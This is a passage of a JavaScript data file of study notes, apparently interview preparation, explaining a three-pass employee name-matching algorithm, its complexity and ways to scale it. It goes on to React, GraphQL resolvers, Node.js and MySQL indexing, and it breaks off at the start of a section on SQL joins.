const SECTIONS = [
  {
    id: 'solution',
    title: 'The Solution — Core Algorithm',
    content: [
      {
        heading: 'What does searchForNames do?',
        body: `Takes an array of employee objects ({ firstName, lastName }) and a plain-text search string. Returns every employee whose name — full, first, or last — appears in that string.`,
      },
      {
        heading: 'The three-pass priority system',
        body: `The function runs three ordered passes over the search string:
1. Pass 1 — Full names (firstName + lastName together)
2. Pass 2 — First names only (if not already consumed by a full-name match)
3. Pass 3 — Last names only (if not already consumed by a full or first-name match)

This order enforces the rules: a full name beats a partial match. Once a word in the search string is "claimed" by a name, it cannot be matched again.`,
      },
      {
        heading: 'The claiming system',
        body: `usedIndexes is a Set of word positions in the search string that have already been matched. When claimMatch("Bob Matthews") succeeds, the indices for "bob" and "matthews" are added to usedIndexes. Later, when first names are processed, "bob" is already claimed — so Bob Matthews' first name does not also match Billy Bob's last name.`,
      },
      {
        heading: 'Why deduplicate names before matching?',
        body: `If two employees are "Amy Smith" and "Amy Smith" (identical), the uniqueFullNames Set ensures we only try to claim "Amy Smith" once from the search string — not twice. But the final .filter() still runs on the original undeduped array, so both Amy Smith entries are returned in the result.`,
      },
      {
        heading: 'What happens when two employees share the same full name? (Amy Smith × 2)',
        body: `Example: arrayToSearch contains two entries both with firstName: "Amy", lastName: "Smith".

Step 1 — Deduplication phase (claiming):
  uniqueFullNames = ["Amy Smith"]   ← Set removes the duplicate
  claimMatch("Amy Smith") is called ONCE
  → findMatches finds ["amy","smith"] at some position in the search string
  → Claims those indices. matchedFullNames = {"Amy Smith"}

Step 2 — Final filter (output):
  arrayToSearch.filter(emp => matchedFullNames.has(getFullName(emp)))
  → Both emp objects have getFullName() === "Amy Smith"
  → Both pass the filter
  → Both are returned in the result

Key insight: deduplication is only about how many times we claim words from the search string. The final output runs on the original array with all duplicates intact — so both Amy Smiths are returned correctly.`,
      },
      {
        heading: 'claimMatch for a duplicate name — what if it ran twice?',
        body: `First call — claimMatch("Amy Smith"):
  findMatches returns [[3, 4]] (found "amy smith" at positions 3 and 4)
  .find() checks [3, 4] — neither index is in usedIndexes
  .every() returns true for both indices → match found
  Adds 3 and 4 to usedIndexes → usedIndexes = {3, 4}
  Returns true ✓

Hypothetical second call — claimMatch("Amy Smith") again (this does NOT happen because deduplication means it's only called once):
  findMatches returns [[3, 4]] again — same positions
  .find() checks [3, 4]: index 3 is already in usedIndexes → .every() = false
  No unclaimed position exists → .find() returns undefined
  match is undefined → returns false ✗

The deduplication via Set prevents the second call entirely. It's both an optimisation (avoids redundant work) and a correctness guarantee (same words aren't claimed twice).`,
      },
    ],
  },
  {
    id: 'functions',
    title: 'Function Breakdown',
    content: [
      {
        heading: 'isLetter(character)',
        body: `Returns true if the character is a Unicode letter.

How: character.toLowerCase() !== character.toUpperCase()

Why not regex /[a-zA-Z]/? That misses accented characters like é, ñ, ü, María, Rémi. The toLowerCase/toUpperCase trick works for the full Unicode range — digits and punctuation have the same upper and lower forms, letters don't.`,
      },
      {
        heading: 'splitIntoWords(text)',
        body: `Converts any string into a normalised lowercase word array.

Steps:
1. Lowercase the entire string
2. Replace every character that isn't a letter, hyphen, or apostrophe with a space
3. Split on spaces, drop empty tokens
4. Strip trailing possessives: nikki's → nikki, thomas' → thomas
5. Drop any tokens that became empty after stripping

Both names and the search string go through this — so comparisons are always apples-to-apples.`,
      },
      {
        heading: 'findMatches(searchWords, name)',
        body: `Finds every position in searchWords where the name's words appear consecutively.

How: sliding window — for each position i, check if the name's words match searchWords starting at i.

Returns: array of index arrays. e.g. for "Bob Matthews" at position 0 → [[0, 1]]
For a single word like "Jane" at position 2 → [[2]]

It returns [] only if the name doesn't appear anywhere in the search string.`,
      },
      {
        heading: 'claimMatch(name)',
        body: `The heart of the deduplication logic.

1. Calls findMatches to find all positions where this name appears
2. Finds the first position where NONE of the indices are in usedIndexes
3. If found: adds those indices to usedIndexes, returns true
4. If every match is already claimed: returns false

This is why "jane" doesn't match Jane Doe when "Jane Flitwick" was already found — index 2 ("jane") was already claimed.`,
      },
      {
        heading: 'startsWithWords / endsWithWords',
        body: `Used as guards in Pass 2 and Pass 3.

startsWithWords("Jane Flitwick", "Jane") → true
Used to skip a first name that was already consumed by a full-name match.

endsWithWords("Billy Bob", "Bob") → true
Used to skip a last name that was already consumed by a full-name match.

These are word-aware comparisons — not naive string prefix/suffix checks. Critical for multi-word names like "Bonisseur de la Batte".`,
      },
      {
        heading: 'findMatches — full breakdown (reduce as a sliding window)',
        body: `function findMatches(searchWords, name) {
  const nameWords = splitIntoWords(name);   // e.g. ["amy","smith"]
  const nameLen   = nameWords.length;       // e.g. 2

  return searchWords.reduce((acc, _, i) => {
    if (nameWords.every((word, j) => word === searchWords[i + j])) {
      acc.push(Array.from({ length: nameLen }, (_, j) => i + j));
    }
    return acc;
  }, []);
}

What each piece does:
  nameWords          — tokenised words of the name being searched for
  nameLen            — how many words the name has (sets inner array length)
  reduce(acc, _, i)  — _ is the current element (ignored); i is the position index
  nameWords.every()  — checks that every word in the name matches searchWords starting at i
    word === searchWords[i + j]  — compares name word j against search word at position i+j
    (consecutive match check)
  Array.from({ length: nameLen }, (_, j) => i + j)
    — generates [i, i+1, ..., i+nameLen-1] — the word positions that would be claimed

For "Amy Smith" at position 3 in searchWords:
  i = 3
  every: "amy" === searchWords[3] ✓, "smith" === searchWords[4] ✓
  push [3, 4]

Result: [[3, 4]] — one match, at positions 3 and 4.
If "Amy Smith" appeared twice in the search string: [[3, 4], [7, 8]]`,
      },
      {
        heading: 'claimMatch — the .find().every() chain explained',
        body: `const match = findMatches(searchWords, name).find((indexes) =>
  indexes.every((index) => !usedIndexes.has(index)),
);

Breaking it down step by step:

1. findMatches(searchWords, name)
   → Returns all positions where the name appears: e.g. [[3, 4], [7, 8]]
   Each inner array is one occurrence of the name in the search string.

2. .find((indexes) => ...)
   → Iterates through the positions [[3, 4], [7, 8]]
   → Returns the FIRST position where the condition is true
   → If no position passes: returns undefined (match is undefined → function returns false)

3. indexes.every((index) => !usedIndexes.has(index))
   → Checks that ALL indices in this position are unclaimed
   → For [3, 4]: is 3 in usedIndexes? No. Is 4 in usedIndexes? No. → true ✓
   → For [7, 8]: is 7 in usedIndexes? No. Is 8 in usedIndexes? No. → true ✓
   → .find() stops at the first true result and returns [3, 4]

4. if (!match) return false
   → If .find() returned undefined (no unclaimed position found) → return false

5. match.forEach(index => usedIndexes.add(index))
   → Marks [3, 4] as claimed → usedIndexes = {..., 3, 4}
   → Returns true ✓

The key: .find() gives you the first valid position; .every() ensures the ENTIRE name's positions are free — a partial overlap is not acceptable.`,
      },
    ],
  },
  {
    id: 'execution',
    title: 'Execution Flow',
    content: [
      {
        heading: 'Phase 1 — Initialisation',
        body: `Runs once before any matching:

1. splitIntoWords(searchString) → searchWords (used by ALL three passes)
2. Four empty Sets created: usedIndexes, matchedFullNames, matchedFirstNames, matchedLastNames
3. Three unique name lists built from arrayToSearch (deduped with Set)`,
      },
      {
        heading: 'Phase 2 — Pass 1: Full Names',
        body: `For each unique full name:
→ claimMatch(fullName) called
  → findMatches scans searchWords for consecutive firstName + lastName words
  → If found and unclaimed: indices claimed, name added to matchedFullNames

After Pass 1: usedIndexes contains word positions of every matched full name.`,
      },
      {
        heading: 'Phase 3 — Pass 2: First Names',
        body: `For each unique first name:
→ Guard: does any matchedFullName start with this firstName? If yes → skip
→ If guard passes: claimMatch(firstName) called
  → findMatches looks for the firstName word(s) in searchWords
  → If found at an unclaimed position: claimed, added to matchedFirstNames`,
      },
      {
        heading: 'Phase 4 — Pass 3: Last Names',
        body: `For each unique last name:
→ Guard 1: does any matchedFullName end with this lastName? If yes → skip
→ Guard 2: is this lastName string in matchedFirstNames? If yes → skip
→ If both guards pass: claimMatch(lastName) called

Guard 2 handles the "bob" case — "Bob" was already matched as a firstName (Bob Matthews), so "Bob" should not also match as a lastName (Billy Bob).`,
      },
      {
        heading: 'Phase 5 — Final Filter',
        body: `arrayToSearch.filter(emp → {
  fullName in matchedFullNames
  OR firstName in matchedFirstNames
  OR lastName in matchedLastNames
})

This runs on the ORIGINAL array (with duplicates). That's why both Amy Smith entries are returned — deduplication only happened during the matching phase.`,
      },
      {
        heading: 'Worked example: "when are jane flitwick and nikki kenicky on holiday?"',
        body: `searchWords = ["when","are","jane","flitwick","and","nikki","kenicky","on","holiday"]
Indices:          0      1      2      3           4      5       6         7     8

Pass 1:
  "Jane Flitwick" → ["jane","flitwick"] at [2,3] → claimed ✓
  "Nikki Kenicky" → ["nikki","kenicky"] at [5,6] → claimed ✓
  All other full names → not found

Pass 2:
  "Jane" → startsWithWords("Jane Flitwick","Jane") = true → SKIPPED
  "Nikki" → startsWithWords("Nikki Kenicky","Nikki") = true → SKIPPED
  All others → not found in search string

Pass 3:
  "Flitwick" → endsWithWords("Jane Flitwick","Flitwick") = true → SKIPPED
  "Kenicky" → endsWithWords("Nikki Kenicky","Kenicky") = true → SKIPPED

Result: [Jane Flitwick, Nikki Kenicky] ✓
Jane Doe is NOT returned because "jane" at index 2 was claimed by the full-name match.`,
      },
    ],
  },
  {
    id: 'complexity',
    title: 'Big O Complexity',
    content: [
      {
        heading: 'Variables',
        body: `N = number of employees (≤ 50 per spec)
W = words in searchString after tokenisation
F = words in a given name (1 for "Kirk", 2 for "Billy Bob", 4 for "Bonisseur de la Batte")
L = character length of a string`,
      },
      {
        heading: 'Per-function complexity',
        body: `isLetter()                → O(1)     — two string ops
splitIntoWords(text)      → O(L)     — single character pass
findMatches(words, name)  → O(W × F) — W positions, F-word check each
claimMatch(name)          → O(W × F) — dominated by findMatches
startsWithWords/endsWithWords → O(L) — two splitIntoWords calls
Each pass                 → O(N × W × F)
Overall                   → O(N × W × F)`,
      },
      {
        heading: 'In practice',
        body: `N ≤ 50, W < 20, F ≤ 4
Worst case ≈ 50 × 20 × 4 = 4,000 operations — effectively constant time.

The constraint of N ≤ 50 makes any significant optimisation premature.`,
      },
      {
        heading: 'If N grew to 1 million',
        body: `Two optimisations would be needed:

1. Inverted word index (pre-processing)
   Build a Map: word → Set of employee indices
   Lookup becomes O(W) instead of O(N × W)

2. Cache normalised name tokens
   Run splitIntoWords once per employee at startup
   Eliminates repeated O(L) calls inside the hot loop

Combined: reduces from O(N×W) to O(W + K) where K = employees whose names share a word with the search string.`,
      },
    ],
  },
  {
    id: 'typescript',
    title: 'TypeScript Conversion',
    content: [
      {
        heading: 'Type definitions',
        body: `interface Employee {
  firstName: string;
  lastName:  string;
}

interface SearchParams {
  arrayToSearch: Employee[];
  searchString:  string;
}

function searchForNames({ arrayToSearch, searchString }: SearchParams): Employee[] {
  // ...
}`,
      },
      {
        heading: 'Typed helpers',
        body: `function isLetter(character: string): boolean { ... }
function splitIntoWords(text: string): string[] { ... }
function findMatches(searchWords: string[], name: string): number[][] { ... }
const claimMatch = (name: string): boolean => { ... }`,
      },
      {
        heading: 'Why TypeScript helps here',
        body: `1. Shape errors caught at compile time — passing { first: "Jane" } instead of { firstName: "Jane" } is a type error before runtime
2. Self-documenting — SearchParams makes the contract explicit without reading implementation
3. Safe refactors — renaming firstName propagates via TS rename refactor
4. Strict null safety — searchString: string cannot be undefined without explicit handling`,
      },
      {
        heading: 'What strict mode adds',
        body: `strictNullChecks — arrayToSearch / searchString cannot be null without explicit handling
noImplicitAny    — all parameters must have explicit types (catches (_, i) in reduce)
strictFunctionTypes — stricter variance checking on function type parameters`,
      },
    ],
  },
  {
    id: 'improvements',
    title: 'Potential Improvements',
    content: [
      {
        heading: 'Correctness issue: matchedFirstNames.has(lastName) is fragile',
        body: `The current guard in Pass 3:

  !matchedFirstNames.has(lastName)

This only works when a lastName string exactly matches a firstName string (e.g. "Bob"). It fails silently for multi-word last names like "de la Batte" — those would never equal a single-word first name in the Set.

Better approach: instead of checking the string, check whether the words of the lastName were already consumed in usedIndexes. If the word positions for "de la batte" are all in usedIndexes, the last name was already claimed — skip it.

Why it still passes all tests: the test data doesn't have a case where a multi-word last name needs to be blocked by a matched first name. The fix matters at scale.`,
      },
      {
        heading: 'Correctness issue: iteration order is non-deterministic for ambiguous inputs',
        body: `The order of uniqueFullNames depends on the order employees appear in arrayToSearch. Whichever full name appears first in the array gets first claim on shared words.

Example: if both "Jane Doe" and "Jane Smith" exist, and the search string is "jane", which entry's firstName gets claimed depends purely on array order.

Fix: sort uniqueFullNames by specificity before the claiming loop — longer names first (more words = more specific). This makes the behaviour deterministic and biased toward the most specific match.

  uniqueFullNames.sort((a, b) =>
    splitIntoWords(b).length - splitIntoWords(a).length
  );`,
      },
      {
        heading: 'Performance: cache normalised name tokens',
        body: `Currently, splitIntoWords is called on the same name string every time it appears in findMatches, startsWithWords, or endsWithWords. With N=50 employees and 3 passes, a single name could be tokenised 10+ times.

Fix — normalise once before the passes:

  const normalised = arrayToSearch.map(emp => ({
    emp,
    fullName:   emp.firstName + " " + emp.lastName,
    fullWords:  splitIntoWords(emp.firstName + " " + emp.lastName),
    firstWords: splitIntoWords(emp.firstName),
    lastWords:  splitIntoWords(emp.lastName),
  }));

All three passes then work off the pre-computed word arrays instead of re-tokenising.`,
      },
      {
        heading: 'Performance: snapshot matchedFullNames before Pass 2 and Pass 3',
        body: `Inside the Pass 2 forEach loop, this line runs on every iteration:

  const usedInFullName = [...matchedFullNames].some(...)

The spread [...matchedFullNames] creates a new array from the Set on every firstName iteration. If 10 full names matched and there are 30 unique first names, that's 30 array allocations.

Fix: compute the snapshot once before the loop:

  const matchedFullNamesArr = [...matchedFullNames];

  uniqueFirstNames.forEach(firstName => {
    const usedInFullName = matchedFullNamesArr.some(name =>
      startsWithWords(name, firstName)
    );
    ...
  });`,
      },
      {
        heading: 'Readability: extract passes into named functions',
        body: `The three passes are currently all inline inside searchForNames. As complexity grows, extracting them makes the orchestration logic obvious at a glance:

  function claimFullNames(searchWords, uniqueFullNames, usedIndexes) { ... }
  function claimFirstNames(searchWords, uniqueFirstNames, matchedFullNames, usedIndexes) { ... }
  function claimLastNames(searchWords, uniqueLastNames, matchedFullNames, matchedFirstNames, usedIndexes) { ... }

The main function then reads as:
  const matched = claimFullNames(...);
  const matchedFirst = claimFirstNames(...);
  const matchedLast = claimLastNames(...);
  return arrayToSearch.filter(...);`,
      },
      {
        heading: 'Readability: accumulate matched employees directly',
        body: `Currently the function maintains three separate Sets (matchedFullNames, matchedFirstNames, matchedLastNames) and then does a final filter at the end.

Alternative: accumulate matched employee objects directly into a single Set during each pass, then return [...matchedEmployees]. This removes the three-Set overhead and the final filter pass, at the cost of slightly less transparency about which pass matched which employee.

Trade-off: the current approach makes debugging easier (you can inspect which pass matched what). Direct accumulation is more concise.`,
      },
    ],
  },
  {
    id: 'scaling',
    title: 'Scaling to 1 Million Employees',
    content: [
      {
        heading: 'Why the current approach breaks at scale',
        body: `The current solution is O(N × W × F):
- N = employees (currently ≤ 50)
- W = words in search string
- F = words in a name

At N=50, this is ~4,000 operations — negligible.
At N=1,000,000, this is ~80,000,000 operations per search request.

If the search endpoint is called by thousands of concurrent users, this becomes unsustainable. Three structural changes are needed:

1. Move the employee list out of the request — store it in a database
2. Pre-build an index at startup, not per-request
3. Use the index to find candidates first, then apply priority matching only on that small subset`,
      },
      {
        heading: 'Fix 1: Inverted word index',
        body: `Pre-build a Map from each word to the set of employee indices that contain it.

  const wordIndex = new Map(); // Map<string, Set<number>>

  employees.forEach((emp, i) => {
    const words = [
      ...splitIntoWords(emp.firstName),
      ...splitIntoWords(emp.lastName),
    ];
    words.forEach(word => {
      if (!wordIndex.has(word)) wordIndex.set(word, new Set());
      wordIndex.get(word).add(i);
    });
  });

At query time:
  const candidateIndices = new Set();
  splitIntoWords(searchString).forEach(word => {
    (wordIndex.get(word) || new Set()).forEach(i => candidateIndices.add(i));
  });
  const candidates = [...candidateIndices].map(i => employees[i]);

Now apply the full priority matching logic only on candidates — typically a tiny subset of 1M employees. Lookup is O(W) instead of O(N × W).`,
      },
      {
        heading: 'Fix 2: Cache normalised tokens at startup',
        body: `At N=1M, re-tokenising names on every search request is expensive. Instead, pre-compute and store normalised word arrays alongside each employee when the application starts (or when data is loaded from the database).

  const employeeIndex = employees.map((emp, i) => ({
    i,
    emp,
    fullWords:  splitIntoWords(emp.firstName + " " + emp.lastName),
    firstWords: splitIntoWords(emp.firstName),
    lastWords:  splitIntoWords(emp.lastName),
  }));

With this in memory, every comparison is array-to-array rather than string-to-string, and splitIntoWords is never called on a name again at query time.`,
      },
      {
        heading: 'Fix 3: Trie for multi-word name matching',
        body: `For very large datasets, the O(W × F) sliding window in findMatches can be replaced with a word-level trie (prefix tree) built from all employee names.

Structure: each node represents one word; leaf nodes store the employees whose name ends there.

  root
  ├── "jane"
  │     ├── "doe"       → [Jane Doe]
  │     └── "flitwick"  → [Jane Flitwick]
  └── "nikki"
        └── "kenicky"   → [Nikki Kenicky]

At query time, scan searchWords once from left to right. At each position, follow trie edges forward. When you reach a leaf node, record a full-name match. If no full-name match, check if the single word is a first-name or last-name node.

Benefit: O(W × max_name_depth) total — you scan the search string once rather than N times.`,
      },
      {
        heading: 'Architecture: where does this live at scale?',
        body: `At 1M employees across thousands of client companies, the search should not run in a Lambda function against an in-memory array. The production architecture would be:

1. MySQL (RDS) stores employees, indexed on firstName and lastName columns
   → Full-text index (FULLTEXT in MySQL) enables server-side name search

2. API layer (Lambda / Node.js) receives the searchString, queries MySQL with a FULLTEXT query to get a small candidate set, then applies the priority-matching logic on those candidates only

3. Elasticsearch / OpenSearch as an alternative to MySQL full-text — better performance and relevance scoring for free-text search at scale, but adds infrastructure complexity

4. Caching: Redis in front of the DB for frequently searched strings — common queries (e.g. "redundancy pay for jane") are cached and returned without hitting the DB

The key insight: push filtering as early in the pipeline as possible. MySQL/Elasticsearch does the coarse filtering; the application code does the fine-grained priority matching.`,
      },
      {
        heading: 'MySQL full-text search — what to know',
        body: `MySQL supports full-text indexes on VARCHAR/TEXT columns:

  ALTER TABLE employees ADD FULLTEXT(firstName, lastName);

  SELECT * FROM employees
  WHERE MATCH(firstName, lastName) AGAINST ('jane flitwick' IN BOOLEAN MODE);

BOOLEAN MODE supports:
  +"jane" +"flitwick"   → must contain both words
  "jane flitwick"       → exact phrase
  jane*                 → prefix wildcard

Limitations:
- Minimum word length (default 3 chars) — "Amy" would not be indexed by default
- Does not handle the priority logic (full > first > last) — that still lives in application code
- Does not strip possessives — preprocessing still needed

The application would use MySQL to get a candidate shortlist, then apply the full searchForNames algorithm on that small set.`,
      },
      {
        heading: 'Trade-off summary: current vs scaled approach',
        body: `Current approach (correct for the given constraint):
  ✓ Simple, readable, self-contained
  ✓ Zero infrastructure dependencies
  ✓ All logic in one place, easy to test
  ✗ O(N × W × F) — does not scale past ~10,000 employees

Scaled approach:
  ✓ O(W + K) per query at runtime (K = small candidate set)
  ✓ Works for millions of employees
  ✗ Requires pre-built index (startup cost, stale if data changes)
  ✗ More moving parts — harder to test, requires cache invalidation strategy
  ✗ Index must be updated whenever an employee is added, renamed, or removed

For an interview: acknowledge that the current solution is intentionally simple because N ≤ 50 was stated. Jumping to an inverted index for 50 employees would be premature optimisation. But articulating the path to scale shows architectural awareness.`,
      },
    ],
  },
  {
    id: 'react',
    title: 'React',
    content: [
      {
        heading: 'Hooks you must know cold',
        body: `useState — manages local component state. Re-renders the component when state changes.
  const [query, setQuery] = useState('');

useEffect — runs side effects after render (data fetching, subscriptions, DOM updates).
  useEffect(() => { fetchData(); }, [dependency]);
  // Empty array = run once on mount. No array = run on every render.

useMemo — memoises an expensive computed value. Only recomputes when dependencies change.
  const filtered = useMemo(() => searchForNames({ arrayToSearch, searchString }), [searchString]);

useCallback — memoises a function reference. Prevents unnecessary re-renders of child components.
  const handleChange = useCallback(e => setQuery(e.target.value), []);

useRef — holds a mutable value that doesn't trigger re-renders (e.g. DOM node reference, timer ID).
  const inputRef = useRef(null);

useContext — reads from a React context without prop drilling.`,
      },
      {
        heading: 'Controlled vs uncontrolled inputs',
        body: `Controlled: React state drives the value. The input is always in sync with state.
  <input value={query} onChange={e => setQuery(e.target.value)} />

Uncontrolled: the DOM owns the value. Accessed via a ref.
  const ref = useRef(); ref.current.value

For a search box, always use controlled — it lets you debounce, validate, and clear programmatically.`,
      },
      {
        heading: 'Debouncing a search input',
        body: `Firing a search on every keystroke is expensive. Debounce delays the call until the user pauses typing.

  function useDebounce(value, delay) {
    const [debounced, setDebounced] = useState(value);
    useEffect(() => {
      const timer = setTimeout(() => setDebounced(value), delay);
      return () => clearTimeout(timer);
    }, [value, delay]);
    return debounced;
  }

  const debouncedQuery = useDebounce(query, 300);
  // Only fires the search 300ms after the user stops typing

Why 300ms? Fast enough to feel responsive, slow enough to avoid firing on every keystroke. Tune based on API cost.`,
      },
      {
        heading: 'Component re-render optimisation',
        body: `React re-renders a component when: state changes, props change, or a parent re-renders.

React.memo — wraps a component to skip re-render if props haven't changed.
  const EmployeeList = React.memo(({ results }) => { ... });

useMemo — prevents re-computing expensive values on every render.
useCallback — stabilises function references passed as props (otherwise new function = new prop = re-render).

When NOT to optimise: premature memoisation adds complexity. Profile first with React DevTools before adding memo/useMemo.`,
      },
      {
        heading: 'Lifting state vs Context vs external store',
        body: `Lifting state: move state to the nearest common parent. Simple and explicit. Right for small component trees.

Context (useContext): share state across deeply nested components without prop drilling. Right for infrequently changing values (theme, auth, locale). Wrong for high-frequency updates (search input state) — every consumer re-renders on change.

External store (Redux, Zustand): right for complex global state with many consumers and updates. Overkill for most features.

For the employee search feature: useState in the search component, lifted to the page if sibling components also need the results.`,
      },
    ],
  },
  {
    id: 'graphql',
    title: 'GraphQL',
    content: [
      {
        heading: 'Full schema for the search feature',
        body: `# The complete schema wrapping searchForNames

  # Input type — mirrors the SearchParams interface in TypeScript
  input SearchInput {
    searchString: String!
  }

  type Employee {
    id:          ID!
    firstName:   String!
    lastName:    String!
    companyId:   ID!
    department:  Department
  }

  type Department {
    id:   ID!
    name: String!
  }

  type SearchResult {
    employees:   [Employee!]!
    totalCount:  Int!
    searchString: String!
  }

  type Query {
    searchEmployees(input: SearchInput!): SearchResult!
  }

Key decisions:
  [Employee!]! — non-null array of non-null employees. Never returns null or nulls in the list.
  SearchResult wrapper — adds totalCount and echoes back the searchString for the UI to display.
  Input type — groups arguments cleanly; easier to extend later without changing the signature.`,
      },
      {
        heading: 'The resolver — where searchForNames lives',
        body: `// resolver.js — this is exactly where your code test function plugs in

  const resolvers = {
    Query: {
      searchEmployees: async (_, { input }, context) => {
        const { searchString } = input;

        // 1. Authorisation — only return this company's employees
        const { companyId } = context.user;

        // 2. Fetch candidates from DB (coarse filter)
        const candidates = await db.execute(
          'SELECT id, firstName, lastName, companyId, departmentId FROM employees WHERE companyId = ?',
          [companyId]
        );

        // 3. Run your searchForNames logic
        const matched = searchForNames({
          arrayToSearch: candidates,
          searchString,
        });

        // 4. Return in the shape the schema expects
        return {
          employees:   matched,
          totalCount:  matched.length,
          searchString,
        };
      },
    },
  };

This is the exact integration point. The GraphQL layer handles auth context and DB access; searchForNames handles the matching logic — clean separation.`,
      },
      {
        heading: 'How the client calls the search query',
        body: `// gql tag defines the query document — sent to the server as a string

  const SEARCH_EMPLOYEES = gql\`
    query SearchEmployees($input: SearchInput!) {
      searchEmployees(input: $input) {
        totalCount
        searchString
        employees {
          id
          firstName
          lastName
          department { name }
        }
      }
    }
  \`;

  // React component using Apollo Client
  function EmployeeSearch() {
    const [query, setQuery] = useState('');
    const debouncedQuery = useDebounce(query, 300);

    const { loading, error, data } = useQuery(SEARCH_EMPLOYEES, {
      variables: { input: { searchString: debouncedQuery } },
      skip: debouncedQuery.length < 2,  // don't search on 0–1 chars
    });

    if (loading) return <Spinner />;
    if (error)   return <ErrorMessage error={error} />;

    return (
      <>
        <input value={query} onChange={e => setQuery(e.target.value)} />
        <p>{data?.searchEmployees.totalCount} results</p>
        <EmployeeList employees={data?.searchEmployees.employees ?? []} />
      </>
    );
  }`,
      },
      {
        heading: 'Query vs Mutation vs Subscription',
        body: `Query — read data. Idempotent, cacheable. Resolvers can run in parallel.
  query SearchEmployees($input: SearchInput!) {
    searchEmployees(input: $input) { employees { firstName lastName } }
  }

Mutation — modifies server state. Not cacheable. Runs sequentially.
  mutation AddEmployee($firstName: String!, $lastName: String!) {
    addEmployee(firstName: $firstName, lastName: $lastName) {
      id firstName lastName
    }
  }

Subscription — real-time server-push over WebSocket.
  subscription OnEmployeeAdded($companyId: ID!) {
    employeeAdded(companyId: $companyId) { firstName lastName }
  }
  // When a new employee is added, every subscribed client gets notified
  // Relevant for an HR platform: admins see new starters appear in real-time

For this role: searchForNames lives inside a Query resolver. Adding employees = Mutation.`,
      },
      {
        heading: 'Error handling — user errors vs system errors',
        body: `GraphQL always returns HTTP 200. Errors appear in the response body.

System error (unexpected — bugs, DB down):
  throw new Error('Database connection failed');
  // Response: { data: null, errors: [{ message: "Database connection failed" }] }

User error (expected — validation, not found):
  // Option 1: return null with an error in the errors array
  throw new UserInputError('Search string must be at least 2 characters');

  // Option 2 (preferred): model errors in the schema
  type SearchResult {
    employees: [Employee!]!
    error:     String        # null if success, message if validation failed
  }
  // Client always gets data back in a predictable shape

Partial success: if Employee.department resolver fails for one employee, GraphQL returns the employee with department: null and adds an error entry — other employees are unaffected.

In Apollo Client:
  const { loading, error, data } = useQuery(...);
  // error = network error OR GraphQL error
  // data can exist alongside error (partial success)`,
      },
      {
        heading: 'The N+1 problem in the context of this feature',
        body: `Scenario: the searchEmployees query returns 10 employees, each needing their department name.

Without DataLoader — N+1 queries:
  // Department field resolver runs once per employee
  Department: {
    name: async (employee) => {
      return db.execute('SELECT name FROM departments WHERE id = ?', [employee.departmentId]);
      // Fires 10 separate DB queries for 10 employees
    }
  }

With DataLoader — 1 batched query:
  const departmentLoader = new DataLoader(async (ids) => {
    const rows = await db.execute(
      'SELECT * FROM departments WHERE id IN (?)', [ids]
    );
    // Return in the same order as ids (DataLoader requirement)
    return ids.map(id => rows.find(r => r.id === id));
  });

  Employee: {
    department: (employee) => departmentLoader.load(employee.departmentId)
    // DataLoader collects all 10 IDs within one tick, fires ONE query
  }

Why it works: DataLoader batches within a single Node.js event loop tick — all 10 department.load() calls happen before the DB query fires.`,
      },
      {
        heading: 'Apollo Client — caching and the search feature',
        body: `Apollo normalises cache by typename + id:
  Employee:1 → { firstName: "Jane", lastName: "Doe" }
  Employee:2 → { firstName: "Bob", lastName: "Matthews" }

Search queries are cached by their variables:
  searchEmployees({ searchString: "jane" }) → cached result A
  searchEmployees({ searchString: "bob" })  → cached result B

Implications for search:
  - Typing "jane" → fires network request, result cached
  - Deleting back and re-typing "jane" → returns cache instantly, no network call
  - fetchPolicy options:
      "cache-first"        — default, returns cache if available
      "network-only"       — always hits server (use for frequently changing data)
      "cache-and-network"  — returns cache immediately, then updates from network

For a live HR system where employees change: use "cache-and-network" so results update without a full reload, but users see something immediately.

Skip option:
  skip: debouncedQuery.length < 2
  // Prevents querying with 0 or 1 characters — avoids returning the entire employee list`,
      },
      {
        heading: 'Testing the GraphQL resolver',
        body: `The resolver is just a function — test it directly without a running GraphQL server.

  // resolver.test.js
  import { resolvers } from './resolvers';
  import { db } from './db';

  jest.mock('./db');  // mock the DB layer

  test('returns matched employees for a search string', async () => {
    // Arrange
    db.execute.mockResolvedValue([
      { id: '1', firstName: 'Jane', lastName: 'Doe',      companyId: '99' },
      { id: '2', firstName: 'Joe',  lastName: 'Bloggs',   companyId: '99' },
      { id: '3', firstName: 'Jane', lastName: 'Flitwick', companyId: '99' },
    ]);

    const context = { user: { companyId: '99' } };
    const input   = { searchString: 'jane flitwick' };

    // Act
    const result = await resolvers.Query.searchEmployees({}, { input }, context);

    // Assert
    expect(result.employees).toEqual([
      { id: '3', firstName: 'Jane', lastName: 'Flitwick', companyId: '99' }
    ]);
    expect(result.totalCount).toBe(1);
  });

Key points:
  - Mock the DB, not searchForNames — the resolver integration is what we're testing
  - Pass context with a real companyId — tests the authorisation filtering
  - The resolver + searchForNames together are tested as a unit`,
      },
    ],
  },
  {
    id: 'nodejs_mysql',
    title: 'Node.js & MySQL',
    content: [
      {
        heading: 'The Node.js event loop',
        body: `Node.js is single-threaded but handles concurrency through the event loop and async I/O.

Order of execution:
  1. Synchronous code runs first (call stack)
  2. process.nextTick() callbacks
  3. Microtasks (Promise .then/.catch)
  4. Timers (setTimeout, setInterval)
  5. I/O callbacks (file reads, network)
  6. setImmediate()

Why it matters: never block the event loop with synchronous CPU work (e.g. a heavy regex, sorting a huge array). For CPU-intensive tasks, offload to a Worker Thread.

searchForNames() is synchronous and CPU-light — safe to run in the event loop.`,
      },
      {
        heading: 'async/await and error handling',
        body: `async/await is syntactic sugar over Promises.

  async function searchHandler(req, res) {
    try {
      const employees = await db.query('SELECT * FROM employees');
      const results = searchForNames({ arrayToSearch: employees, searchString: req.query.q });
      res.json(results);
    } catch (err) {
      console.error(err);
      res.status(500).json({ error: 'Internal server error' });
    }
  }

Common mistake: forgetting to await inside a loop. Use Promise.all() for parallel async operations, not a for loop with await (which runs sequentially).`,
      },
      {
        heading: 'MySQL indexes and query performance',
        body: `An index is a data structure that speeds up lookups on a column, at the cost of slower writes and extra storage.

Types:
  PRIMARY KEY — unique, clustered (data stored in index order)
  UNIQUE       — enforces uniqueness, fast lookups
  INDEX        — speeds up WHERE, JOIN, ORDER BY on a column
  FULLTEXT     — enables keyword search on text columns

For employee search:
  CREATE INDEX idx_firstName ON employees(firstName);
  CREATE INDEX idx_lastName  ON employees(lastName);
  -- or for combined search:
  ALTER TABLE employees ADD FULLTEXT(firstName, lastName);

EXPLAIN: prefix any SELECT with EXPLAIN to see if MySQL is using an index or doing a full table scan.
  EXPLAIN SELECT * FROM employees WHERE firstName = 'Jane';`,
      },
      {
        heading: 'SQL joins — know these cold',
